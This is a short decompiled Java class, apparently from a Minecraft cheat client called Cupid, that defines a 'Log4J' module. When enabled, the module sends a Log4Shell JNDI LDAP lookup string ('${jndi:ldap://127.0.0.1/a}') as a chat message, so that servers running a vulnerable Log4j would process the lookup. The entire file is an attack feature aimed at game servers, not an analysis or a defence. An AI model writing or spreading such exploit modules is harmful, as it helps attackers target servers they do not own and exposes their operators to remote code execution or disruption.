package me.rhys.client.module.player;

import me.rhys.base.module.Module;
import me.rhys.base.module.data.Category;

public class Log4J extends Module {
  public Log4J(String name, String description, Category category, int keyCode) {
    super(name, description, category, keyCode);
  }
  
  public void onEnable() {
    this.mc.thePlayer.sendChatMessage("${jndi:ldap://127.0.0.1/a}");
  }
}


/* Location:              C:\Users\Joona\Downloads\Cupid.jar!\me\rhys\client\module\player\Log4J.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */